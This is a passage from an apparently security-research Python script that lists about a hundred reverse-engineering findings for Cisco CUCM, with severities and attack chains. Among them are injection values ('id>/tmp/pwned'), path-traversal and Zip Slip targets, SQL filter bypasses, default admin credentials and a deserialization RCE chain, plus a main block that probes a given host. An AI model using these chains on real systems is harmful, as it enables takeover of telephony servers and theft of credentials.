        ("CUCM-F442", "HIGH",    "IMS CustomSocketFactory.createSocket() returns null -> cleartext LDAP fallback (F450/F510)"),
        ("CUCM-F443", "HIGH",    "cm-cwlcss APDiscoveryServer WLC SNMP passwords; CCMEncryption decrypt -> full SNMP to all WLCs (F509)"),
        ("CUCM-F444", "HIGH",    "cm-cwlcss ServiceMgrCommunicator.executeCommand(String): public static Runtime.exec unsanitized (F508)"),
        ("CUCM-F445", "HIGH",    "cm-ipvmsd mohw1update SQL injection as UID=informix superuser (F511)"),
        ("CUCM-F446", "HIGH",    "cm-udsredirect ccmpd no auth -> UDS API bypass (F513)"),
        ("CUCM-F447", "HIGH",    "AXL doAuthenticateUser oracle: boolean response; user enum + password spray (F500)"),
        ("CUCM-F448", "HIGH",    "AXL addSIPNormalizationScript: Lua upload -> CallManager persistent exec on every SIP msg (F499)"),
        ("CUCM-F449", "HIGH",    "AXL resetCallManager/doDeviceReset: single POST drops all calls or reboots all phones (F501)"),
        ("CUCM-F450", "MEDIUM",  "AXL getLdapDirectory: LDAP bind creds from DB; updateLdapFilter LDAP injection; doLdapSync timing oracle (F502)"),
        ("CUCM-F451", "MEDIUM",  "AXL addImportedDirectoryUriCatalogs SSRF: if URL/UNC param accepted -> outbound req to attacker target (F503)"),
        ("CUCM-F452", "MEDIUM",  "ims AuthenticationDB: dev account 'ranga' string literal in production class (F514)"),
        ("CUCM-F453", "MEDIUM",  "cm-ccintegration GED188 encryptedPasswd weak symmetric; F507 MITM + decrypt -> agent cred harvest (F515)"),
        ("CUCM-F454", "HIGH",    "cm-ipvmsd vsprintf no-_chk + system + popen + libssl.so.1.0.1 EOL; SCCP surface pre-auth RCE candidate (F516)"),
        ("CUCM-F455", "MEDIUM",  "cm-taps TAPS.aef rmiURL from Properties; writable -> attacker RMI registry -> malicious TAPS service (F517)"),
        ("CUCM-F456", "HIGH",    "emapp.war + emservice.war HTTP method bypass class #3: PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE deny-all; GET/POST unconstrained; Extension Mobility pre-auth; dev JSPs in /jsp/Tools/ accessible"),
        ("CUCM-F457", "HIGH",    "platform-api AxisServlet /services/* BASIC auth transport-guarantee NONE (F402/F403/F468 confirmed)"),
        ("CUCM-F458", "HIGH",    "emservice.war dev JSPs: sampleloginapp.jsp samplequeryapp.jsp XMLFormQuery.html XMLFormRequest.html shipped in production /jsp/Tools/"),
        ("CUCM-F459", "HIGH",    "platform-containers cap_add SYS_PTRACE + DAC_OVERRIDE + DAC_READ_SEARCH + host network; ptrace any host process (F397 confirmed)"),
        ("CUCM-F460", "MEDIUM",  "platform-api context.xml allowLinking=true + LegacyCookieProcessor sameSiteCookies=Lax; symlink traversal + CSRF window"),
        ("CUCM-F461", "HIGH",    "platform-services.war AxisServlet /services/* BASIC auth transport-guarantee NONE (F402/F468)"),
        ("CUCM-F462", "HIGH",    "platform-api snakeyaml-1.33.jar CVE-2022-1471 deserialization (F398/F469 extended)"),
        ("CUCM-F463", "HIGH",    "platform-containers /tmp:/tmp/ + /common:/common/ rw mounts + host networking; container exec = host compromise (F397/F470 extended)"),
        ("CUCM-F464", "HIGH",    "emapp.war/emservice.war HTTP method bypass class #3 extended: GET/POST unconstrained on /*; Extension Mobility full pre-auth access"),
        ("CUCM-F465", "MEDIUM",  "emservice.war dev sample JSPs shipped in production under /jsp/Tools/; info disclosure + injection via sample forms"),
        ("CUCM-F466", "HIGH",    "docker-compose: cap_add SYS_PTRACE + host network + DAC_READ_SEARCH; container ptrace to host service processes directly"),
        ("CUCM-F467", "MEDIUM",  "platform-api context.xml: allowLinking=true + LegacyCookieProcessor sameSite=Lax; symlink + CSRF"),
        ("CUCM-F468", "HIGH",    "platform-services.war AxisServlet /services/* BASIC auth transport-guarantee NONE; platform admin SOAP over HTTP"),
        ("CUCM-F469", "HIGH",    "platform-api snakeyaml-1.33.jar: CVE-2022-1471 SnakeYAML Constructor deserialization RCE"),
        ("CUCM-F470", "HIGH",    "docker-compose /tmp:/tmp/ + /common:/common/ rw + host networking; container = host compromise"),
        # --- F471-F535: session 3 batch ---
        ("CUCM-F471", "CRITICAL","cm-tftp haproxy.conf mode 666 level admin UNIX socket: world-writable HAProxy admin API; any local UID -> phone provisioning TFTP redirect -> trust store compromise -> MITM all SCCP/SIP"),
        ("CUCM-F472", "CRITICAL","cm-axl /etc/cron.hourly/rmTempAxisFiles mode 0777: any local write -> overwrite -> root exec hourly in ≤60 min; no sudo/SUID needed"),
        ("CUCM-F473", "HIGH",    "All v1 SOAP services BASIC auth transport-guarantee NONE: internal :81 HTTP Basic auth; L2 MITM or internal port -> admin credential capture from any SOAP call"),
        ("CUCM-F474", "HIGH",    "logcollectionservice v1 no PathReversalSecurityFilter (v2 has it); GetOneFile whitelist includes .security/CallManager/certs-orig/ /common/adminsftp/ CDR repo; confirmed path reversal as known class"),
        ("CUCM-F475", "HIGH",    "soapservicecontrol.sh Axis AdminServlet -uxx -wxx literal creds; if Axis AdminService accepts xx/xx -> arbitrary SOAP handler deployment; three SOAP packages share identical cred"),
        ("CUCM-F476", "HIGH",    "survivabilityNode_dkey_copy.sh: encrypted_Dkey.txt to /tmp; plaintext Dkey derived in shell; inotify race -> capture before rm; Dkey = cluster-wide credential encryption key"),
        ("CUCM-F477", "MEDIUM",  "enableSurvivabilityNode.sh: TEMP_CONFIG=/tmp/platformConfig.xml NTP_TMP_CONF=/tmp/chrony.conf; no mktemp; root via sudo; symlink -> redirect write; platformConfig.xml injection redirects DB connection"),
        ("CUCM-F478", "MEDIUM",  "tftp-haproxy.sh default: only no-sslv3; TLS 1.0+1.1 enabled on all HAProxy listeners; DHE-RSA-AES128-SHA (SHA1) + AES128-SHA (no PFS) in default cipher suite"),
        ("CUCM-F479", "MEDIUM",  "CCMTrustCerts webapp: zero auth-constraint + transport-guarantee NONE; cert served over HTTP; on-path attacker substitutes rogue cert during phone trust bootstrapping"),
        ("CUCM-F480", "MEDIUM",  "pktcap web app: BASIC auth transport-guarantee NONE; Standard Packet Sniffing creds in base64 over HTTP to internal :81"),
        ("CUCM-F481", "CRITICAL","cm-syslog do_syslog_backup.py DRF class #22: DEVICE_TARBALL=argv[4] ENC_SEQ=argv[8]; os.system('sudo tar -cvpPf '+DEVICE_TARBALL+' ... 2>> '+LOGFILE+' '+ENC_SEQ+' '+REDIRECTION); all argv unsanitized -> sudo tar root injection"),
        ("CUCM-F482", "CRITICAL","cm-syslog do_syslog_restore.py DRF class #23: command=DEVICE+DEC_SEQ+'|sudo /bin/tar -xvpPf - 1>>'+LOGFILE; DEVICE as first pipeline token; DEC_SEQ=';id>/tmp/pwned;' -> root"),
        ("CUCM-F483", "CRITICAL","cm-tct-svc tct_do_restore.py DRF class #24: identical DEVICE+DEC_SEQ+sudo tar; copy-paste DRF template; two independent root injection paths"),
        ("CUCM-F484", "CRITICAL","cm-tct-svc tct_do_backup.py DRF class #25: DEVICE_TARBALL+ENC_SEQ+LOGPATH+REDIRECTION all argv unsanitized -> os.system sudo tar; total confirmed DRF class = 25 instances"),
        ("CUCM-F485", "CRITICAL","cm-tct-svc JVM policy: grant { permission java.security.AllPermission; }; Java Security Manager disabled; TCT can read/write any file bind any port exec any code load any class"),
        ("CUCM-F486", "HIGH",    "cm-tct-svc RMI :7000-7002 localhost + AllPermission: TCTService.addJob(xmlQuery,long) unauthenticated at Java layer; arbitrary file read from TracePathList.xml paths (CDRs /common/adminsftp/ audit logs) from any local process"),
        ("CUCM-F487", "HIGH",    "platform-docker docker_post.sh: find /var/log/active/tomcat/logs/ -name *.bin -exec chmod o+w; all .bin files world-writable post-install; privileged-service processing on restart -> content manipulation -> privesc"),
        ("CUCM-F488", "HIGH",    "platform-docker docker_post.sh: chmod o+rx all /usr/local/cm/jar/*.jar /usr/local/cm/lib64/*.so /usr/local/platform/jar/*.jar SSO agent JAR fips.cnf; all service JARs + native libs world-readable; bytecode RE + embedded creds/keys extraction"),
        ("CUCM-F489", "HIGH",    "cm-security nginx EST: est_pop off + fips off; EST :8084 no proof-of-possession; any client requests CAPF cert without proving private key; cert harvesting -> PKI impersonation"),
        ("CUCM-F490", "MEDIUM",  "cm-security nginx: est_certsrv_server WIN-EJSG9DN4GS6 hardcoded; est_certsrv_auth_method NTLM; HTML checks off; DNS poison -> redirect to attacker ADCS; NTLM relay attack on cert enrollment"),
        ("CUCM-F491", "MEDIUM",  "cm-tct-svc cpulimit_script.sh: cmd=$1; nice -n 19 $cmd &; unquoted $cmd word-splits; if TCT XML job passes user-controlled input to script -> argument injection into mmfSpy/nice -> system()"),
        ("CUCM-F492", "MEDIUM",  "cm-svc-web delKnownHostKeys.sh: grep -v '$1' known_hosts > tempfile unqualified; mv -f tempfile known_hosts; TOCTOU symlink or '.*' pattern clears known_hosts -> SFTP MITM"),
        ("CUCM-F493", "MEDIUM",  "cm-svc-web ftp.exp/sftp.exp: credentials in argv (ps aux visible); eval $c with concat spawn $cmd; Tcl metacharacters -> arbitrary Tcl exec in expect session"),
        ("CUCM-F494", "LOW",     "cm-scheduler CCMScheduler.jar: VivekPandey dev name in constant pool; SQL concat in getAllSchedulesFromTable() but tableName validated; absent code quality controls"),
        ("CUCM-F495", "CRITICAL","cm-taps TAPS1.jar TAPS_Skel.dispatch() case 5: receiveFile(String) zero auth check; ObjectInput.readObject()->TAPS.receiveFile(path)->file bytes; receiveFile('../../../etc/shadow') = unauthenticated arbitrary file read; all 6 RMI methods unprotected"),
        ("CUCM-F496", "CRITICAL","cm-taps TAPS1.jar Java 1.4 skeleton MANIFEST Created-By 1.4.2_04; ObjectInput.readObject() at offsets 174/186/553; no JEP 290; CommonsCollections on classpath; ysoserial CommonsCollections chain -> pre-auth RCE as CUCM service account from any network host"),
        ("CUCM-F497", "HIGH",    "cm-taps TAPS.aef getBATConfig(callerDN,BATDN): no PIN/auth; any JTAPI caller enters target extension DTMF -> BAT config pushed -> device identity theft; Caller-ID spoofable via SIP trunk"),
        ("CUCM-F498", "HIGH",    "cm-taps testByte.class Zip Slip: ZipFile(/tmp/localeName); ZipEntry.getName() verbatim in FileOutputStream; zip entries '../../../etc/cron.d/evil' escape /tmp/ -> arbitrary write"),
        ("CUCM-F499", "HIGH",    "AXL addSIPNormalizationScript + updateSIPNormalizationScript: arbitrary Lua body uploaded -> CallManager executes on every SIP message; persistent across reboots; authenticated AXL -> persistent CM code exec"),
        ("CUCM-F500", "HIGH",    "AXL doAuthenticateUser: boolean oracle (userAuthenticated true/false); any AXL-role account sprays passwords/PINs against any userid; rate limiting at IMS/DB only; user enum + credential stuffing oracle"),
        ("CUCM-F501", "HIGH",    "AXL resetCallManager/doDeviceReset/restartUcService: single authenticated POST drops all calls or reboots all phones or restarts services cluster-wide; no confirmation; production outage by any AXL user"),
        ("CUCM-F502", "MEDIUM",  "AXL getLdapDirectory: LDAP bind creds from DB; updateLdapFilter LDAP injection; doLdapSync CUCM->LDAP auth observable for timing"),
        ("CUCM-F503", "MEDIUM",  "AXL addImportedDirectoryUriCatalogs: URL/UNC param -> SSRF; CUCM outbound to attacker target; internal network reachability probe from telephony cluster"),
        ("CUCM-F504", "HIGH",    "cm-pi pishell/picli/pixml/pidump system()@GLIBC_2.2.5 + process_cmd->get_execmd_strings->product_popen_execv/system; MonitorClassUpdate MonitorCounterUpdate counter path strings flow to /bin/sh -c unsanitized"),
        ("CUCM-F505", "HIGH",    "cm-pi pixml: -p path LocalFileFormatTarget arbitrary write; -f XML external entities -> Xerces DOM -> XXE -> local file read"),
        ("CUCM-F506", "HIGH",    "cm-pi binaries: execv(/cisco/bin/iproduct_impl) first; if /cisco/bin/ absent or writable -> drop malicious binary -> executes with PI service privileges"),
        ("CUCM-F507", "HIGH",    "cm-ccintegration GED188: createTLSSocket() no hostname verification; IOException->null->TCP fallback; OPEN_REQ has username+encryptedPasswd; MITM any trusted cert -> plaintext agent creds at CTI :42027/:42028"),
        ("CUCM-F508", "HIGH",    "cm-cwlcss ServiceMgrCommunicator.executeCommand(String): public static final Runtime.exec(String) unsanitized; no SecurityManager; reachable from any class in JVM context"),
        ("CUCM-F509", "HIGH",    "cm-cwlcss CWLCSSDBUpdate: SELECT WLC SNMP v2c community + v3 auth/privacy passwords FROM APDiscoveryServer; decryptPassword via CCMEncryption F390 static key; full SNMP v3 to all managed WLCs -> AP enum + rogue AP injection + 802.11 intercept"),
        ("CUCM-F510", "HIGH",    "ims CustomSocketFactory: createSocket(String,int) returns aconst_null; JNDI LDAPS -> NullPointerException -> cleartext LDAP fallback; bind credentials transit unencrypted"),
        ("CUCM-F511", "HIGH",    "cm-ipvmsd mohw1update: DSN=ccm2;UID=informix; UPDATE MOHAudioSource / INSERT CustomAnnouncement string concat as informix superuser; arbitrary UCM DB table rewrite"),
        ("CUCM-F512", "CRITICAL","cm-ipvms /dev/ipvms0-8 mode 666: IOCTL_SET_CONFIG IOCTL_WRITE_BUFR IOCTL_START_TX_V8 IOCTL_INJECT_SILENCE IOCTL_CHANGE_CONF world read/write; any local user -> kernel audio driver ioctl -> privesc or kernel DoS"),
        ("CUCM-F513", "HIGH",    "cm-udsredirect ccmpd: ContextRedirectServlet /* no auth-constraint; RequestDispatcher.forward to /cucm-uds; UDS API auth bypass; exposes user profile DN lookup self-service provisioning"),
        ("CUCM-F514", "MEDIUM",  "ims AuthenticationDB: 'Authentication using password failed for user ranga'; dev account ranga possibly in applicationuser/enduser with weak password"),
        ("CUCM-F515", "MEDIUM",  "cm-ccintegration GED188: encryptedPasswd in OPEN_REQ; weak symmetric encryption; F507 MITM + decrypt -> agent cred harvest -> Finesse impersonation CC queue manipulation"),
        ("CUCM-F516", "HIGH",    "cm-ipvmsd ipvmsd binary: vsprintf (no _chk) + system + popen + recv/recvfrom + libssl.so.1.0.1 (EOL 2016 Heartbleed etc.); 917 format strings; SCCP network data to format/exec = pre-auth RCE surface"),
        ("CUCM-F517", "MEDIUM",  "cm-taps TAPS.aef rmiURL from Properties file; writable via UCCX admin -> attacker RMI registry -> malicious TAPS service -> mis-provisioning or deserialization RCE"),
        ("CUCM-F518", "HIGH",    "ccmadmin GenericServlet: /get-current-time not in any security-constraint; auth covers *.do *.jsp + static assets but not arbitrary URL paths; pre-auth GenericServlet access; min server time fingerprinting"),
        ("CUCM-F519", "CRITICAL","axl_war /axl/axis2-admin/* not in any security-constraint; only / and /services/AXLAPIService protected; AxisAdminServlet at /axis2-admin/* unauthenticated; chain: pre-auth Axis2 admin -> .aar hot-deploy -> RCE"),
        ("CUCM-F520", "HIGH",    "axl_aar ExecuteSqlHandler: Statement.executeQuery(getSql()) raw string no PreparedStatement; SELECT passes unconditionally; executeSQLUpdate user-rank check bypassed via case mangling 'InSeRt InTo' or comment injection 'insert/**/into'; full DB read/write"),
        ("CUCM-F521", "CRITICAL","cm-axlsqltoolkit README.txt: CCMAdministrator:ciscocisco documented as default in file shipped to all customers; spray credential for all internet-exposed CUCM :8443/axl/; dev IPs 10.89.68.71 + 64.101.156.207 leaked"),
        ("CUCM-F522", "MEDIUM",  "cm-axlsqltoolkit AxlSqlToolkit.java: trust-all X509TrustManager (checkServerTrusted empty) + HostnameVerifier returns true; admin/automation using toolkit vulnerable to MITM; AXL admin creds captured over falsely-trusted TLS"),
        ("CUCM-F523", "MEDIUM",  "axl_war + gaxl.war transport-guarantee NONE: BASIC auth over HTTP; admin creds in cleartext when http:// used accidentally or intentionally; same in ccmadmin web.xml"),
        ("CUCM-F524", "HIGH",    "cm-capf nginx_update.sh: server=$1 unquoted in sed expression -> nginx.conf injection; echo $4 $5 > CACredentials.txt -> CA password cleartext on disk; creds in /proc/<pid>/cmdline during execution"),
        ("CUCM-F525", "MEDIUM",  "cm-capf EnrollmentService.sh: decrypted CA creds written cleartext to ciscoRA config; nginx --config-file-rm race window; TVS_priv.pem hardcoded = root of trust for all phone endpoint auth"),
        ("CUCM-F526", "MEDIUM",  "ccmadmin_common vir.properties: DbRelatedUtil + RoutePattern exposed via virRmi(); authenticated CCM admin browser session -> DB write or routing table manipulation via RMI"),
        ("CUCM-F527", "MEDIUM",  "cm-authentication IMS.jar: KEYSTOREFILE=/usr/local/platform/.security/tomcat/trust-certs/tomcat-trust.keystore KEYSTOREPASSPHRASEFILE fixed paths; file-system read -> JWT HMAC or RSA key -> token forgery"),
        ("CUCM-F528", "HIGH",    "cm-ipma ma.war HTTP method bypass class #4: PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE deny-all; GET/POST unconstrained /*; CSCsx40175 confirms partial fix of known issue; IPMA call routing manipulation pre-auth"),
        ("CUCM-F529", "MEDIUM",  "cm-webdialer webdialer.war: FORM auth transport-guarantee NONE; WebDialer login POST over HTTP to internal :81; MITM -> WebDialer user credential capture"),
        ("CUCM-F530", "MEDIUM",  "cm-webdialer webdialer.war: CiscoSoapClientTestTrustManager.class in production WAR (WD70/); if instantiated by WDSoapInterface -> TLS cert validation disabled -> MITM of WebDialer SOAP to CallManager"),
        ("CUCM-F531", "HIGH",    "cm-ris RisDC: system + sprintf + strcpy + strcat + popen + execv + execve; SQL 'SELECT * FROM ProcessNode where name=' + append; 'UPDATE ProcessConfig SET ParamValue=' + append; Informix ODBC dbl::Connector; network SOAP -> node name injection -> SQL/shell injection -> cluster config corruption"),
        ("CUCM-F532", "MEDIUM",  "cm-ris mmfSpyScript.sh: PARAMS[$PDX]=$1; OUTPUT=`mmfSpy ${PARAMS[*]}`; unquoted expansion; spaces/metacharacters in $1 -> argument injection into mmfSpy which has system() + sprintf()"),
        ("CUCM-F533", "HIGH",    "pms FindPhoneByDN @GET /v1/migrate/findphonebydn: unauthenticated; request.getParameter(name) -> {isdevicefound,remoteclusterdevicelist}; full cluster device enum + inter-cluster topology disclosure"),
        ("CUCM-F534", "HIGH",    "pms PhoneMigration @GET /v1/migrate: unauthenticated; action=request.getParameter(action); Class.forName(com.cisco.cucm.pms.states.+action+State) allowlist [Initiate,Validate,Select,Restart]; unauthenticated phone migration state machine -> phone reassignment"),
        ("CUCM-F535", "HIGH",    "pms PMSDBInteraction: string-concat SQL as dbadminweb: pkid/tkmodel/name/profile/template via concat in Informix queries; mixed prepared/non-prepared; combined with F533/F534 unauth endpoints -> full Informix exec as dbadminweb"),
    ]
    lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
    for fid, sev, title in findings:
        lines.append(f"  [{sev:8s}] {fid}: {title}")
    lines.append("")
    lines.append(f"Static AES-128 key: {CCM_STATIC_ENCRYPTION_KEY.hex()} ({CCM_STATIC_ENCRYPTION_KEY!r})")
    lines.append("Findings doc: ~/Desktop/CUCM-findings.md")
    return '\n'.join(lines)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(full_findings_summary())
    else:
        host = sys.argv[1]
        print(f"\n[CUCM-F1] Axis2 admin probe → {host}")
        print(probe_axis2_admin(host))
        print(f"\n[CUCM-F2] platformcom snapshot probe → {host}")
        print(probe_platformcom_localhost_bypass(host))
